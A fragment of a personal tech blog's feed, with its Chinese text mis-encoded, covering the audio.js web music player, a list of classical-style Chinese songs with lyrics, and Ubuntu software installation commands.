<h3 id="audio-js"><a href="#audio-js" class="headerlink" title="audio.js"></a>audio.js</h3><p><a href="https://kolber.github.io/audiojs/" target="_blank" rel="noopener">audio.js</a>æ˜¯ä¸€æ¬¾è½»é‡çº§çš„éŸ³ä¹æ’­æ”¾å™¨ï¼Œä¸‹è½½æ–‡ä»¶åï¼Œå°†æ–‡ä»¶å¤¹ &quot;audiojs&quot; æ”¾åœ¨ç½‘ç«™æ–‡ä»¶ç›®å½•ä¸­ï¼Œé€šè¿‡ä»¥ä¸‹ä»£ç çš„å½¢å¼å°†è¯¥æ’­æ”¾å™¨å¼•å…¥ç½‘é¡µä¸­ã€‚</p>
<pre><code class="html">&lt;head&gt;
    ...
    &lt;script src=&quot;/audiojs/audio.min.js&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
      audiojs.events.ready(function() {
        audiojs.createAll();
      });
    &lt;/script&gt;
    ...
&lt;/head&gt;

&lt;body&gt;
    ...
    &lt;!-- éŸ³ä¹æ’­æ”¾å™¨ä½ç½® --&gt;
    &lt;!-- preload=&quot;auto&quot; å¯ä»¥æ›¿æ¢ä¸º autoplay æˆ–è€… loop  --&gt;
    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot;
    preload=&quot;auto&quot;&gt;&lt;/audio&gt;
    &lt;!-- è¯´æ˜ï¼šä½¿ç”¨è¯¥æ’ä»¶åï¼Œå…¶è„šæœ¬è¯­è¨€å°†è‡ªåŠ¨ä¸ºå…¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š
        class=&quot;audiojs&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;
        å¦‚æœä¸€ä¸ªé¡µé¢ä¸­å­˜åœ¨å¤šä¸ªaudiojsæ’­æ”¾å™¨ï¼Œå…¶idå°¾æ•°å°†ä»0é€ä¸€å¢åŠ 
        é€šè¿‡cssä¿®æ”¹è¿™äº›å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜æ’­æ”¾å™¨çš„å¤–è§‚ --&gt;
    ...
&lt;/body&gt;
</code></pre>
<p>[ç¤ºä¾‹ï¼šæèŠ±è½©å¤–é›¨ï¼Œé“¾æ¥ç”±ä¸Šè¿°1.2æ–¹å¼è€Œå¾—]</p>
<audio class="musicPlayer" src="https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3" preload="auto"></audio>

<p>[ç¤ºä¾‹htmlæºç ]</p>
<pre><code class="html">&lt;div class=&quot;audiojs   playing&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;&gt;
    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot; preload=&quot;auto&quot;&gt;&lt;/audio&gt;
    &lt;div class=&quot;play-pause&quot;&gt;
        &lt;p class=&quot;play&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;pause&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;loading&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;error&quot;&gt;&lt;/p&gt;
    &lt;/div&gt;
    &lt;div class=&quot;scrubber&quot;&gt;
        &lt;div class=&quot;progress&quot; style=&quot;width: 167.146px;&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;loaded&quot; style=&quot;width: 280px;&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;time&quot;&gt;
        &lt;em class=&quot;played&quot;&gt;02:22&lt;/em&gt;/&lt;strong class=&quot;duration&quot;&gt;03:57&lt;/strong&gt;
    &lt;/div&gt;  
    &lt;div class=&quot;error-message&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre>
<h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><ul>
<li><a href="http://www.ithome.com/html/it/195970.htm" target="_blank" rel="noopener">7 æ¬¾é«˜é¢œå€¼ HTML5 æ’­æ”¾å™¨</a></li>
<li><a href="http://www.oschina.net/news/27466/html5-audio-players" target="_blank" rel="noopener">10 ä¸ªåŸºäº Web çš„ HTML5 éŸ³ä¹æ’­æ”¾å™¨</a></li>
<li><a href="http://www.shejidaren.com/free-audio-players.html" target="_blank" rel="noopener">10 ä¸ªå…è´¹å¼€æºçš„ JS éŸ³ä¹æ’­æ”¾å™¨æ’ä»¶</a></li>
<li><a href="http://www.17sucai.com/pins/tag/3189.html" target="_blank" rel="noopener">æ’­æ”¾å™¨ jquery ç‰¹æ•ˆä»£ç </a></li>
</ul>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç½‘æ˜“äº‘éŸ³ä¹çš„æ’­æ”¾å™¨æ’ä»¶ä½¿ç”¨æ–¹ä¾¿ï¼Œä½†æ˜¯è¿æ¥æ•ˆç‡å¤ªä½ï¼Œç»å¸¸è·å–ä¸åˆ°èµ„æºæˆ–è€…è·å–é€Ÿåº¦è¿‡æ…¢ï¼Œè€Œ  audiojs  æ’­æ”¾å™¨è™½ç„¶å¤–è§‚ç®€é™‹äº›ï¼Œä½†èµ„æºä¸‹è½½æ•ˆç‡è¿˜ä¸é”™ï¼Œè€Œä¸”èµ„æºåœ°å€å¯ä»¥è‡ªå®šä¹‰ï¼Œä¸ä¼šå—é™ã€‚æ‰€ä»¥ï¼Œå„æœ‰åˆ©å¼Šï¼Œä¾æƒ…å†µè€Œå®šå§ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¼˜ç¾çš„å¤é£æ­Œæ›²]]></title>
      <url>https://www.litreily.top/2016/10/27/antiquity-music/</url>
      <content type="html"><![CDATA[<h2 id="å¤é£"><a href="#å¤é£" class="headerlink" title="å¤é£"></a>å¤é£</h2><blockquote>
<p><a href="http://baike.baidu.com/subview/297/9729252.htm" target="_blank" rel="noopener">å¤é£</a> æ˜¯ä¸€ç±»æ–°å‹çš„æ–‡åŒ–ï¼Œæ˜¯ç°ä»£äººå¯¹å¤ä»£æ›²é£çš„ç§°å‘¼ã€‚&quot;å¤é£&quot; ä»¥ä¸­å›½çš„ä¼ ç»Ÿæ–‡åŒ–ä¸ºåŸºè°ƒï¼Œç»“åˆä¸­å›½ä¼ ç»Ÿçš„æ–‡å­¦ã€ç´æ£‹ä¹¦ç”»ã€è¯—è¯æ­Œèµ‹ç­‰ï¼Œç»è¿‡ä¸æ–­çš„å‘å±•ç£¨åˆï¼Œå½¢æˆäº†æ¯”è¾ƒå®Œå¤‡çš„éŸ³ä¹ã€æ–‡å­¦ã€ç»˜ç”»ç­‰è‰ºæœ¯å½¢å¼ã€‚</p>
</blockquote>
<h3 id="å¤é£éŸ³ä¹ç¤¾å›¢"><a href="#å¤é£éŸ³ä¹ç¤¾å›¢" class="headerlink" title="å¤é£éŸ³ä¹ç¤¾å›¢"></a>å¤é£éŸ³ä¹ç¤¾å›¢</h3><p><a href="http://www.mymmqm.com/" target="_blank" rel="noopener">å¢¨æ˜æ£‹å¦™</a> <a href="http://5sing.kugou.com/lfmmusic/default.html" target="_blank" rel="noopener">é¸¾å‡¤é¸£</a> <a href="http://5sing.kugou.com/pingshaluoyan/default.html" target="_blank" rel="noopener">å¹³çº±è½é›</a> <a href="http://music.163.com/#/user/home?id=64846286" target="_blank" rel="noopener">æ»¡æ±‰å…¨å¸­</a> <a href="http://www.oyinyue.com/11388725" target="_blank" rel="noopener">å£°è‡ªåœ¨</a> <a href="http://5sing.kugou.com/qianchengzuige/default.html" target="_blank" rel="noopener">åƒåŸé†‰æ­Œ</a> <a href="http://5sing.kugou.com/liushangqushui/default.html" target="_blank" rel="noopener">æµè§æ›²æ°´</a> <a href="http://5sing.kugou.com/5590972/default.html" target="_blank" rel="noopener">èŠ±é­æ¥¼</a> <a href="http://5sing.kugou.com/qiange/default.html" target="_blank" rel="noopener">åƒæ­Œæœªå¤®</a> <a href="http://5sing.kugou.com/27373394/default.html" target="_blank" rel="noopener">äº‘æ­Œè½</a></p>
<h3 id="å¤é£éŸ³ä¹äºº"><a href="#å¤é£éŸ³ä¹äºº" class="headerlink" title="å¤é£éŸ³ä¹äºº"></a>å¤é£éŸ³ä¹äºº</h3><p><a href="http://www.xiami.com/artist/68934" target="_blank" rel="noopener">æ²³å›¾</a> <a href="http://www.xiami.com/artist/52636" target="_blank" rel="noopener">è‘£è´</a> <a href="http://www.xiami.com/artist/98637" target="_blank" rel="noopener">å°æ›²å„¿</a> <a href="http://www.xiami.com/artist/103550" target="_blank" rel="noopener">å°‘å¸å‘½</a> <a href="http://y.baidu.com/qingnong914" target="_blank" rel="noopener">æ¸…å¼„</a> <a href="http://bd.kuwo.cn/mingxing/%E6%BD%87%E6%A2%A6%E4%B8%B4.htm?from=baidu" target="_blank" rel="noopener">æ½‡æ¢¦ä¸´</a> <a href="http://www.xiami.com/artist/87301" target="_blank" rel="noopener">æª€çƒ§</a> <a href="http://www.xiami.com/artist/65156" target="_blank" rel="noopener">å¿ƒç„¶</a> <a href="http://www.xiami.com/artist/55553" target="_blank" rel="noopener">è§äººå‡¤</a> <a href="http://bd.kuwo.cn/mingxing/%E5%87%8C%E4%B9%8B%E8%BD%A9.htm?from=baidu" target="_blank" rel="noopener">å‡Œä¹‹è½©</a> <a href="http://i.xiami.com/huanger117" target="_blank" rel="noopener">æ™ƒå„¿</a> <a href="http://www.xiami.com/artist/102392" target="_blank" rel="noopener">é‡å°çƒŸ</a> <a href="http://www.xiami.com/artist/80464" target="_blank" rel="noopener">éŸ³é¢‘æ€ªç‰©</a></p>
<h3 id="å¤é£ç½‘ç«™"><a href="#å¤é£ç½‘ç«™" class="headerlink" title="å¤é£ç½‘ç«™"></a>å¤é£ç½‘ç«™</h3><p><a href="http://5sing.kugou.com/" target="_blank" rel="noopener">5sing</a> <a href="http://xingmaow.com/" target="_blank" rel="noopener">å¤é£æçŒ«ç½‘</a> <a href="http://www.gufengquan.com/" target="_blank" rel="noopener">å¤é£åœˆè®ºå›</a></p>
<h2 id="å¤é£æ­Œæ›²å“é‰´"><a href="#å¤é£æ­Œæ›²å“é‰´" class="headerlink" title="å¤é£æ­Œæ›²å“é‰´"></a>å¤é£æ­Œæ›²å“é‰´</h2><h3 id="æèŠ±å¼¦å¤–é›¨"><a href="#æèŠ±å¼¦å¤–é›¨" class="headerlink" title="æèŠ±å¼¦å¤–é›¨"></a>æèŠ±å¼¦å¤–é›¨</h3><blockquote>
<p><a href="http://baike.baidu.com/subview/10846918/19226803.htm" target="_blank" rel="noopener">æèŠ±å¼¦å¤–é›¨</a>  æ˜¯ç”±  æ½‡æ¢¦ä¸´  ä½œæ›²åŠç¼–æ›²ï¼Œè‹¥ç´«é¸¢ä½œè¯ï¼Œç”±  <a href="http://baike.baidu.com/view/3113695.htm" target="_blank" rel="noopener">è¥¿å›½çš„æµ·å¦–</a>ã€<a href="http://baike.baidu.com/view/8616563.htm" target="_blank" rel="noopener">CRITTY</a>  æ¼”å”±çš„ä¸€é¦–ä¼˜è´¨å¤é£æ­Œæ›²ã€‚æ”¶å½•åœ¨CRITTYçš„ã€Šå¼¦ä¸Šæ˜¥é›ªã€‹åŸåˆ›å¤é£éå®ä½“ä¸“è¾‘ä¸­ã€‚MVç”±å°‰è¿Ÿå˜‰é¦¨åˆ¶ä½œï¼Œå±•ç°äº†æ±Ÿå—æ°´ä¹¡çš„ç¾ä¸½é£æ™¯ï¼Œè®²è¿°äº†è¥¿å¢è®°ä¸­ä¸€æ®µæ‰å­ä½³äººç›¸æ€ç©ºå®ˆçš„æ•…äº‹ã€‚</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=0&height=66"></iframe>

<pre><code class="txt">ä½œæ›²/ç¼–æ›²ï¼šæ½‡æ¢¦ä¸´
ä½œè¯ï¼šè‹¥ç´«é¸¢
æ¼”å”±ï¼šè¥¿å›½çš„æµ·å¦–ã€CRITTY

æµèºæ‚„é£è¿‘èˆ¹ä¾§  ä¼´æ¡¨å£°ä½è¯­æµ…è¯´
æŸ³æ¢¢æ²¾ç»¿äº†çƒŸæ³¢  ç»•å ¤ä¸‰åˆ†æ˜¥è‰²
æ—§ä¹¦ç¿»å…¥å¯»å¸¸è°ƒ  éš”å²¸ä¾ç¨€å´è¶Šæ­Œ
åå¤ç€å‡ å›å•¼ç¬‘  å¾€æ¥å‡ æ®µç¦»åˆ
æœ‰ä¹¦ç”Ÿç¿©ç¿©é£æµ  æœ‰ä½³äººç‹¬åæ¥¼é˜
æœ‰ä¸€æ—¥æ“¦è‚©è€Œè¿‡  æƒ¹æ¥ä¸¤æƒ…è„‰è„‰
è¯—æ–‡é‡Œé£æœˆæ¸æµ“  åªä¸è§å¤©é•¿åœ°ä¹…
å¿ƒäº‹è½åœ¨ç´å¼¦å¤–  åˆä¸è°è½»è½»è¯´
è¯´é‚£å¹´çƒŸé›¨ç©ºæ¿›  æèŠ±èˆ¹æ‘‡æ‘†è€Œè¿‡
è¿‡è°å®¶æ¥¼å°  ä¸€å£°å¼¦æ­Œæ‹‚è½

ä»–ç´ ç™½è¡£ç€  å±±æ°´é—´å‡ ç¨‹è¿œæ¸¸
å ªæŠ˜ä½•æŠ˜å¹´å¹´æŸ³è‰²
å½“æŸ³æ¢¢ä¸‹çš„é›†å¥  å°½æ•°æµè¿‡çœ¼åº•
æ‹ˆä¸€ç¼•æ˜¥é£æµ…æµ…ä½œåº
å¾…åˆ°è¡Œé—´å­—é‡Œ
å†ä¸æ˜¯çœ¼å‰æœå¤•
æ›²ä¸­äººæ—©å·²ç¦»é¢˜
å½“ä¸€é˜µé˜µä¸´çª—é›¨  æ´—æ—§é‚£æ—¶å¿ƒç»ª
æ›²ä¸­äººè¿œéš”åƒé‡Œä¸‡é‡Œ  ä¸çŸ¥ä¸è§‰çš„åœç¬”
ç•™ä¸‹ä½™éŸµå¾…ç»­  å°±åœ¨é‚£ç‰‡çƒŸæ³¢å¤–æ·¡æˆäº†è¿¤é€¦

åæ¥äº‹ä¸çŸ¥å¦‚ä½•  é‚£ä½³äººè¿˜åœ¨æ¥¼é˜
ç‹¬å¯¹ç€é›¨å¸˜è§ç‘Ÿ  ä¸€å­—ä¸€å¥æ–Ÿé…Œ
è¯—æ–‡é‡Œé£æœˆæ®‹ç•™  ä¸ç»æ„æ¢äº†è§’è‰²
é™ˆè¯è½åœ¨ç´å¼¦å¤–  è¿˜æœ‰è°è½»è½»è¯´
è¯´é‚£å¹´çƒŸé›¨ç©ºæ¿›  æèŠ±èˆ¹æ‘‡æ‘†è€Œè¿‡
è¿‡è°å®¶æ¥¼å°  ä¸€å£°å¼¦æ­Œè½å¯

å¥¹ç­‰è¿‡å‡ ç•ª  ç»µç»µé£çµ®äº¦ç™½å¤´
ç©ºæŠ˜è¿˜æŠ˜å¹´å¹´æŸ³è‰²
å½“æŸ³æ¢¢ä¸‹çš„é›†å¥  å°½æ•°æµè¿‡çœ¼åº•
æ‹ˆä¸€ç¼•æ˜¥é£æµ…æµ…ä½œåº  å¾…åˆ°è¡Œé—´å­—é‡Œ
å†ä¸æ˜¯çœ¼å‰æœå¤•  æ›²ä¸­äººæ—©å·²ç¦»é¢˜
å½“ä¸€é˜µé˜µä¸´çª—é›¨  æ´—æ—§é‚£æ—¶å¿ƒç»ª
æ›²ä¸­äººè¿œéš”åƒé‡Œä¸‡é‡Œ  ä¸çŸ¥ä¸è§‰çš„åœç¬”
ç•™ä¸‹ä½™éŸµå¾…ç»­  å°±åœ¨é‚£ç‰‡çƒŸæ³¢å¤–æ·¡æˆäº†è¿¤é€¦
</code></pre>
<p><img src="/assets/music/xinghuaxianwaiyu.png" alt="æèŠ±å¼¦å¤–é›¨"></p>
<h3 id="é‡è¤"><a href="#é‡è¤" class="headerlink" title="é‡è¤"></a>é‡è¤</h3><blockquote>
<p>ç”±  YTå›  åˆ¶ä½œçš„æ©™å…‰æ–‡å­—æ¸¸æˆã€Šé€†è¢­ä¹‹æ˜Ÿé€”é—ªè€€ã€‹çš„å‰§ä¸­å‰§ã€Šé‡é¾™ã€‹çš„ä¸»é¢˜æ›²ã€Šé‡è¤ã€‹ã€‚  <a href="http://baike.baidu.com/item/%E9%81%87%E8%90%A4" target="_blank" rel="noopener">é‡è¤</a>  æ˜¯<a href="http://baike.baidu.com/view/8616563.htm" target="_blank" rel="noopener">CRITTY</a> æ¼”å”±æ­Œæ›²ï¼Œç”±æ‰§ç´ å…®ä½œæ›²ï¼Œé¡¾è†è½ä½œè¯ã€‚</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=66"></iframe>

<pre><code class="txt">æ¼”å”±ï¼šCRITTY
    æ­Œæ›²ç›‘åˆ¶ï¼šæˆ‘æ˜¯YT
    ä½œæ›²/ç­–åˆ’/å’Œå£°ç¼–å†™ï¼šæ‰§ç´ å…®
    ä½œè¯ï¼šé¡¾è†è½
    ç¼–æ›²ï¼šæ½‡æ¢¦ä¸´

    å°‰è¿Ÿé¾™ç‚(é¾™ç‹)ï¼šæ—¢ç„¶ä½ å«æµè¤...
    é‚£ä¸å¦‚â€¦
    ä¸å¦‚æˆ‘å°±èµ ä½ æ¼«å¤©æµè¤å§â€¦

    è‹¥åƒå¹´çš„å…‰é˜´ è½®å›é‡Œ
ã€€ã€€æ˜¯å¦åªä¸ºå¯»è§…ç€ä½ 
ã€€ã€€æè‹¥æ‰€æœ‰æœˆæ˜
ã€€ã€€åœ†ç¼ºæˆ–æ˜¯é˜´æ™´ éƒ½åªä¸ºäº†ä½ 
ã€€ã€€å°˜ç¼˜ä¼¼ä¸€åœºèŠ±é›¨
ã€€ã€€çœ‰ç›®ç¼±ç»»ä¸­æ¯å¯‚
ã€€ã€€æŒ‡é—´çš„ç¬æ¯
ã€€ã€€æ‹¾å¾—ä½ ä¸€é¢—æ³ªæ»´
ã€€ã€€è‹¥å¿˜å·çš„æ¶Ÿæ¼ª éšæˆ‘å¿ƒ
ã€€ã€€æ˜¯å¦åªä¸ºä¸å¿˜è®°ä½ 
ã€€ã€€æè‹¥æ‰€æœ‰æ€ç»ª
ã€€ã€€æ€œæƒœæˆ–æ˜¯æ‚²æˆš éƒ½åªä¸ºäº†ä½ 
ã€€ã€€å°˜ç¼˜ä¼¼ä¸€åœºçƒŸå½±
ã€€ã€€çœ‰ç›®ç¼±ç»»ä¸­é£˜é›¶
ã€€ã€€å¿ƒä¹‹æ‰€å¯„
ã€€ã€€åŠ«æ•°åº”å£°è€Œèµ·

ã€€ã€€å‰ç”Ÿä»Šä¸–æ¥ç”Ÿ
ã€€ã€€ä¸ä½ ç›¸é‡ åœ¨æ¯ä¸€ä¸ªæ¢¦é‡Œ
ã€€ã€€æ‹‚è¢–å”¤æ¼«å¤©æµè¤
ã€€ã€€æŒå¿ƒå¾®å…‰è°çœ¼ä¸­å€’æ˜ 
ã€€ã€€å›çœ¸ä¸èˆç¦»å»
ã€€ã€€æ­¤æƒ…ä¸ºä½  åœ¨å¿ƒä¸Šåœæ –
ã€€ã€€ä¸‹ä¸€ä¸– å†ä¸ä½ æ°¸ä¸åˆ†ç¦»

    å°‰è¿Ÿé¾™ç‚(é¾™ç‹)ï¼šåªæ˜¯ä»ä»Šå¾€åï¼Œ
    ä½ éƒ½è¦å­¦ä¼šè‡ªå·±ä¸€ä¸ªäºº...
    å‹‡æ•¢èµ°ä¸‹å»ï¼Œå³ä¾¿æ²¡æœ‰æˆ‘ï¼Œä¹Ÿä¸è¦å®³æ€•â€¦

    è‹¥å¿˜å·çš„æ¶Ÿæ¼ª éšæˆ‘å¿ƒ
ã€€ã€€æ˜¯å¦åªä¸ºä¸å¿˜è®°ä½ 
ã€€ã€€æè‹¥æ‰€æœ‰æ€ç»ª
ã€€ã€€æ€œæƒœæˆ–æ˜¯æ‚²æˆš éƒ½åªä¸ºäº†ä½ 
ã€€ã€€å°˜ç¼˜ä¼¼ä¸€åœºæµè¤
ã€€ã€€çœ‰ç›®ç¼±ç»»ä¸­å®é™
ã€€ã€€ç…§è°å‰è¡Œ
ã€€ã€€ç¿è‹¥å½»å¤œç¹æ˜Ÿ
ã€€ã€€å‰ç”Ÿä»Šä¸–æ¥ç”Ÿ
ã€€ã€€ä¸ä½ ç›¸é‡ åœ¨æ¯ä¸€ä¸ªæ¢¦é‡Œ
ã€€ã€€æ‹‚è¢–å”¤æ¼«å¤©æµè¤
ã€€ã€€æŒå¿ƒå¾®å…‰è°çœ¼ä¸­å€’æ˜ 
ã€€ã€€å›çœ¸ä¸èˆç¦»å»
ã€€ã€€æ­¤æƒ…ä¸ºä½  åœ¨å¿ƒä¸Šåœæ –
ã€€ã€€ä¸‹ä¸€ä¸– å†ä¸ä½ æ°¸ä¸åˆ†ç¦»

ã€€ã€€å‰ç”Ÿä»Šä¸–æ¥ç”Ÿ
ã€€ã€€ä¸ä½ ç›¸é‡ åœ¨æ¯ä¸€ä¸ªæ¢¦é‡Œ
ã€€ã€€æ‹‚è¢–å”¤æ¼«å¤©æµè¤
ã€€ã€€æŒå¿ƒå¾®å…‰è°çœ¼ä¸­å€’æ˜ 
ã€€ã€€å›çœ¸ä¸èˆç¦»å»
ã€€ã€€æ­¤æƒ…ä¸ºä½  åœ¨å¿ƒä¸Šåœæ –
ã€€ã€€è¿™ä¸€ä¸– æ„¿ä¸ä½ å…±å­˜å¤©åœ°
ã€€ã€€è¿™ä¸€ä¸– æ„¿ä¸ä½ å…±å­˜å¤©åœ°
</code></pre>
<p><img src="/assets/music/yuying.png" alt="é‡è¤"></p>
<h3 id="å€¾å°½å¤©ä¸‹"><a href="#å€¾å°½å¤©ä¸‹" class="headerlink" title="å€¾å°½å¤©ä¸‹"></a>å€¾å°½å¤©ä¸‹</h3><blockquote>
<p>å€¾å°½å¤©ä¸‹ æ˜¯éŸ³ä¹å›¢é˜Ÿ <a href="http://baike.baidu.com/view/1204149.htm" target="_blank" rel="noopener">å¢¨æ˜æ£‹å¦™</a> åˆ›ä½œçš„å¤é£æ­Œæ›²ï¼Œç”± <a href="http://baike.baidu.com/subview/649792/11273294.htm" target="_blank" rel="noopener">finale</a> ä½œè¯ï¼Œ<a href="http://baike.baidu.com/subview/4151/9915126.htm" target="_blank" rel="noopener">æ²³å›¾</a> ä½œæ›²ã€ç¼–æ›²å¹¶æ¼”å”±ã€‚</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=27571867&auto=0&height=66"></iframe>

<pre><code class="txt">ä½œè¯ï¼šFinale
ä½œæ›²/ç¼–æ›²/æ¼”å”±ï¼šæ²³å›¾

åˆ€æˆŸå£°å…±ä¸ç«¹æ²™å“‘
è°å¸¦ä½ çœ‹åŸå¤–å®æ€
ä¸ƒé‡çº±è¡£ è¡€æº…äº†ç™½çº±
å…µä¸´åŸä¸‹å…­å†›ä¸å‘
è°çŸ¥å†è§å·²æ˜¯ ç”Ÿæ­»æ— è¯
å½“æ—¶ç¼ è¿‡çº¢çº¿åƒåŒ
ä¸€å¿µä¹‹å·®ä½œä¸ºäººå«
é‚£é“ä¼¤ç–¤ è°çš„æ—§ä¼¤ç–¤
è¿˜èƒ½ä¸åŠ¨å£°è‰²é¥®èŒ¶
è¸ç¢è¿™ä¸€åœº ç››ä¸–çƒŸèŠ±
è¡€æŸ“æ±Ÿå±±çš„ç”»
æ€æ•Œä½ çœ‰é—´ ä¸€ç‚¹æœ±ç ‚
è¦†äº†å¤©ä¸‹ä¹Ÿç½¢
å§‹ç»ˆä¸è¿‡ ä¸€åœºç¹å
ç¢§è¡€æŸ“å°±æ¡ƒèŠ±
åªæƒ³å†è§ ä½ æ³ªå¦‚é›¨ä¸‹
å¬åˆ€å‰‘å–‘å“‘
é«˜æ¥¼å¥„å¥„ä¸€æ¯ å€¾å¡Œ

æ˜¯è¯´ä¸€ç”Ÿå‘½çŠ¯æ¡ƒèŠ±
è°ä¸ºä½ ç®—çš„é‚£ä¸€å¦
æœ€æ˜¯æ— ç‘•é£æµä¸å‡
ç”»æ¥¼è¥¿ç•” åå¼¹çµç¶
æš–é£å¤„å¤„ è°å¿ƒçŒ¿æ„é©¬
è‰²æˆé­‚ä¸é¢ å€’å®¹å
å…€è‡ªä¸è‚¯ç›¸å¯¹ç…§èœ¡
è¯´çˆ±æŠ˜èŠ± ä¸çˆ±é’æ¢…ç«¹é©¬
åˆ°å¤´æ¥ç®—çš„é‚£ä¸€å¦
ç»ˆæ˜¯ä¸ºä½  è¦†äº†å¤©ä¸‹
æ˜æœˆç…§äº®å¤©æ¶¯
æœ€åè°åˆå¾—åˆ°äº†è’¹è‘­
æ±Ÿå±±å˜¶é¸£æˆ˜é©¬
æ€€æŠ±ä¸­é‚£å¯‚é™çš„å–§å“—
é£è¿‡å¤©åœ°è‚ƒæ€
å®¹åè°¢å å›ä¸´å¤©ä¸‹
ç™»ä¸Šä¹é‡å®å¡”
çš‡å¦ƒ æœ±ç ‚
çš‡å¦ƒ æœ±ç ‚
çœ‹ä¸€å¤œæµæ˜Ÿé£’æ²“
å›åˆ°é‚£ä¸€åˆ¹é‚£
å²æœˆæ— å£°ä¹Ÿè®©äººå®³æ€•
æ¯è—¤é•¿å‡ºææ¡ 
åŸæ¥æ—¶å…‰å·²ç¿©ç„¶è½»æ“¦
æ¢¦ä¸­æ¥¼ä¸Šæœˆä¸‹
ç«™ç€çœ‰ç›®ä¾æ—§çš„ä½ å•Š
æ‹‚å»è¡£ä¸Šé›ªèŠ±
å¹¶è‚©çœ‹ å¤©åœ°æµ©å¤§
å›åˆ°é‚£ä¸€åˆ¹é‚£
å²æœˆæ— å£°ä¹Ÿè®©äººå®³æ€•
æ¯è—¤é•¿å‡ºææ¡ 
åŸæ¥æ—¶å…‰å·²ç¿©ç„¶è½»æ“¦
æ¢¦ä¸­æ¥¼ä¸Šæœˆä¸‹
ç«™ç€çœ‰ç›®ä¾æ—§çš„ä½ å•Š
æ‹‚å»è¡£ä¸Šé›ªèŠ±
å¹¶è‚©çœ‹ å¤©åœ°æµ©å¤§
æ¢¦ä¸­æ¥¼ä¸Šæœˆä¸‹
ç«™ç€çœ‰ç›®ä¾æ—§çš„ä½ å•Š
æ‹‚å»è¡£ä¸Šé›ªèŠ±
å¹¶è‚©çœ‹ å¤©åœ°æµ©å¤§
</code></pre>
<p><img src="/assets/music/qingjintianxia.png" alt="å€¾å°½å¤©ä¸‹"></p>
<h2 id="æ’­æ”¾åˆ—è¡¨"><a href="#æ’­æ”¾åˆ—è¡¨" class="headerlink" title="æ’­æ”¾åˆ—è¡¨"></a>æ’­æ”¾åˆ—è¡¨</h2><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="https://music.163.com/outchain/player?type=0&id=2310717269&auto=0&height=430"></iframe>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntuä¸‹å®‰è£…å¸¸ç”¨è½¯ä»¶]]></title>
      <url>https://www.litreily.top/2016/10/12/installSW/</url>
      <content type="html"><![CDATA[<h2 id="apt-get-install"><a href="#apt-get-install" class="headerlink" title="apt-get install"></a>apt-get install</h2><h3 id="Atom"><a href="#Atom" class="headerlink" title="Atom"></a>Atom</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/atom
sudo apt-get update  
sudo apt-get install atom
</code></pre>
<p><code>add-apt-repository</code>ç”¨äºæ·»åŠ è½¯ä»¶æºï¼Œ<code>apt-get update</code>ç”¨äºæ›´æ–°è½¯ä»¶æºï¼Œæ›´æ–°åå³å¯ä½¿ç”¨<code>apt-get install</code>å®‰è£…æ‰€éœ€çš„è½¯ä»¶ã€‚</p>
<h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/sublime-text-3  
sudo apt-get update  
sudo apt-get install sublime-text-install
</code></pre>
<h2 id="æ·»åŠ å¿«æ·æ–¹å¼"><a href="#æ·»åŠ å¿«æ·æ–¹å¼" class="headerlink" title="æ·»åŠ å¿«æ·æ–¹å¼"></a>æ·»åŠ å¿«æ·æ–¹å¼</h2><p>åœ¨Ubuntuä¸‹ï¼Œæœ‰äº›debå®‰è£…åŒ…ï¼Œå®‰è£…å®Œæˆååªèƒ½é€šè¿‡ç»ˆç«¯å¯åŠ¨ï¼Œè€Œä¸”ä¸èƒ½å…³é—­ç»ˆç«¯ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç»™åº”ç”¨ç¨‹åºæ·»åŠ å¿«æ·æ–¹å¼ã€‚</p>
<pre><code class="bash">sudo vim /usr/share/applications/appName.desktop
</code></pre>
<p>ä»¥eclipseä¸ºä¾‹åœ¨æ–°æ·»åŠ çš„æ–‡ä»¶<code>eclipse.desktop</code>ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="yml">[Desktop Entry]  
Type=application  
Name=eclipse  
Commit=Eclipse Integrated Development Environment  
Exec=/opt/eclipse/eclipse  
Icon=/opt/eclipse/icon.xpm  
Terminal=false  
